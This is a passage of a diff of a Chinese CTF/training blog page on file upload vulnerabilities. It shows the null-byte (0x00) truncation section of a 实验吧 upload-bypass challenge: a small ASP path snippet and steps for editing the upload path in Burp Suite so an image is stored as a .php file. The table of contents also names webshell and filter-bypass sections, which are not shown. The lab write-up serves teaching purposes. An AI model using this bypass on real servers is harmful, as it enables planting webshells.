+<h2 id="0x00-截断上传"><a href="#0x00-截断上传" class="headerlink" title="0x00 截断上传"></a>0x00 截断上传</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">path=<span class="string">"upfiles/picture/"</span></span><br><span class="line">file=<span class="string">"20180321.jpg"</span></span><br><span class="line">upfilename=path &amp; file <span class="string">'最后的上传地址</span></span><br><span class="line"><span class="string">%&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>upfilename</code>即为最终名字，意思为如果地址为<code>picture/1.php+</code>，文件名为<code>1.jpg</code>则最终上传上去的文件路径为<code>picture/1.php+1.jpg</code>。0x00 截断的思路即为将+之后的内容忽略掉使上传文件<code>1.jpg</code>最终上传到<code>1.php</code>中。</p>
+<p>先随便上传一个图片文件，提示需要上传 php 文件。同样上传 php 文件，提示需要上传其他格式文件。</p>
 <p><img src="/pics/WEB集训/三/7.png" alt="提示上传其他格式"></p>
-<p>这里就需要用到0x00截断。提交图片后使用burpsuite抓包，在<code>/uploads/</code>后面加上<code>1.php+</code>。</p>
+<p>这里就需要用到 0x00 截断。提交图片后使用 burpsuite 抓包，在<code>/uploads/</code>后面加上<code>1.php+</code>。</p>
 <p><img src="/pics/WEB集训/三/8.png" alt="添加上1.php+"></p>
-<p>然后在hex里把<code>+</code>对应的十六进制改为<code>00</code>。</p>
+<p>然后在 hex 里把<code>+</code>对应的十六进制改为<code>00</code>。</p>
 <p><img src="/pics/WEB集训/三/9.png" alt="修改数据"></p>
-<p>修改完成后得到flag。</p>
+<p>修改完成后得到 flag。</p>
 <h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://www.php.cn/php-weizijiaocheng-359309.html" target="_blank" rel="noopener">http://www.php.cn/php-weizijiaocheng-359309.html</a><br><a href="https://blog.csdn.net/zhanghw0917/article/details/46793847" target="_blank" rel="noopener">https://blog.csdn.net/zhanghw0917/article/details/46793847</a><br><a href="https://www.cnblogs.com/bmjoker/p/9141322.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9141322.html</a></p>
 
       
@@ -414,7 +414,7 @@
     <div id="toc" class="toc-article">
     <strong class="toc-title">Contents</strong>
     
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#木马"><span class="nav-number">1.1.</span> <span class="nav-text">木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用函数"><span class="nav-number">1.2.</span> <span class="nav-text">利用函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpinfo"><span class="nav-number">1.3.</span> <span class="nav-text">phpinfo()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux基本命令"><span class="nav-number">1.4.</span> <span class="nav-text">Linux基本命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cknife（菜刀）"><span class="nav-number">2.</span> <span class="nav-text">Cknife（菜刀）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA之File-Upload"><span class="nav-number">2.1.</span> <span class="nav-text">DVWA之File Upload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞检测"><span class="nav-number">3.</span> <span class="nav-text">文件上传漏洞检测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#客户端javascript检测"><span class="nav-number">3.1.</span> <span class="nav-text">客户端javascript检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端检测绕过（MIME类型检测）"><span class="nav-number">3.2.</span> <span class="nav-text">服务端检测绕过（MIME类型检测）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端目录路径检测"><span class="nav-number">3.3.</span> <span class="nav-text">服务端目录路径检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件扩展名检测"><span class="nav-number">3.4.</span> <span class="nav-text">服务端文件扩展名检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单检测"><span class="nav-number">3.4.1.</span> <span class="nav-text">黑名单检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白名单检测"><span class="nav-number">3.4.2.</span> <span class="nav-text">白名单检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件内容检测"><span class="nav-number">3.5.</span> <span class="nav-text">服务端文件内容检测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Upload-Labs"><span class="nav-number">4.</span> <span class="nav-text">Upload-Labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-01"><span class="nav-number">4.1.</span> <span class="nav-text">pass-01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-02"><span class="nav-number">4.2.</span> <span class="nav-text">pass-02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-11"><span class="nav-number">4.3.</span> <span class="nav-text">pass-11</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验吧之上传绕过"><span class="nav-number">5.</span> <span class="nav-text">实验吧之上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00截断上传"><span class="nav-number">5.1.</span> <span class="nav-text">0x00截断上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">6.</span> <span class="nav-text">参考网站</span></a></li></ol>
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#木马"><span class="nav-number">1.1.</span> <span class="nav-text">木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用函数"><span class="nav-number">1.2.</span> <span class="nav-text">利用函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpinfo"><span class="nav-number">1.3.</span> <span class="nav-text">phpinfo()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-基本命令"><span class="nav-number">1.4.</span> <span class="nav-text">Linux 基本命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cknife（菜刀）"><span class="nav-number">2.</span> <span class="nav-text">Cknife（菜刀）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA-之-File-Upload"><span class="nav-number">2.1.</span> <span class="nav-text">DVWA 之 File Upload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞检测"><span class="nav-number">3.</span> <span class="nav-text">文件上传漏洞检测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#客户端-javascript-检测"><span class="nav-number">3.1.</span> <span class="nav-text">客户端 javascript 检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端检测绕过（MIME-类型检测）"><span class="nav-number">3.2.</span> <span class="nav-text">服务端检测绕过（MIME 类型检测）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端目录路径检测"><span class="nav-number">3.3.</span> <span class="nav-text">服务端目录路径检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件扩展名检测"><span class="nav-number">3.4.</span> <span class="nav-text">服务端文件扩展名检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单检测"><span class="nav-number">3.4.1.</span> <span class="nav-text">黑名单检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白名单检测"><span class="nav-number">3.4.2.</span> <span class="nav-text">白名单检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件内容检测"><span class="nav-number">3.5.</span> <span class="nav-text">服务端文件内容检测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Upload-Labs"><span class="nav-number">4.</span> <span class="nav-text">Upload-Labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-01"><span class="nav-number">4.1.</span> <span class="nav-text">pass-01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-02"><span class="nav-number">4.2.</span> <span class="nav-text">pass-02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-11"><span class="nav-number">4.3.</span> <span class="nav-text">pass-11</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验吧之上传绕过"><span class="nav-number">5.</span> <span class="nav-text">实验吧之上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-截断上传"><span class="nav-number">5.1.</span> <span class="nav-text">0x00 截断上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">6.</span> <span class="nav-text">参考网站</span></a></li></ol>
     
     </div>
   </aside>
